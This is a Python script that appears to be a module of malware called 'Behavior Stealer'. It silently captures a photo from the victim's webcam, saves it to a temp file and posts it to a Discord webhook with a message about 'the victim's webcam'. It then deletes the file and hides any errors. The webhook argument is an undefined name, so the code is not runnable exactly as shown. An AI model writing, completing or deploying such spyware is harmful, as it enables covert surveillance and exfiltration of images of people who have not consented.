import cv2
import os
import tempfile
import requests
import json


AVATAR_URL = "https://cdn.discordapp.com/attachments/1375534863049822279/1383070822603817100/logo.png?ex=684d7494&is=684c2314&hm=cc402308b49849ba4db04ecad335ecb7bdd8e566ef1916b0a8396a37d4bfdb3b&"

def capture_webcam_image():
    cam = cv2.VideoCapture(0)
    if not cam.isOpened():
        raise Exception("Cannot open webcam")

    ret, frame = cam.read()
    cam.release()

    if not ret:
        raise Exception("Failed to capture image")

    return frame

def save_image_temp(frame):
    temp_dir = tempfile.gettempdir()
    image_path = os.path.join(temp_dir, "webcam_capture.png")
    cv2.imwrite(image_path, frame)
    return image_path

def send_webcam_image(webhook_url, image_path):
    with open(image_path, "rb") as f:
        files = {
            "file": ("webcam_capture.png", f)
        }

        data = {
            "username": "Behavior Stealer",
            "avatar_url": AVATAR_URL,
            "embeds": [{
                "title": "📸 Webcam Capture",
                "description": "Here is the latest screenshot from the victim's webcam.",
                "color": 0x00FFFF,
                "footer": {"text": "Behavior Stealer \U0001F47E"}
            }]
        }

        headers = {
            "Content-Type": "application/json"
        }

        
        response = requests.post(webhook_url, data={"payload_json": json.dumps(data)}, files=files)

    print(f"[+] Webhook status: {response.status_code}")

def main():
    try:
        frame = capture_webcam_image()
        image_path = save_image_temp(frame)
        send_webcam_image(Behavior, image_path)
        os.remove(image_path)
    except Exception as e:
        print(f"")

if __name__ == "__main__":
    main()
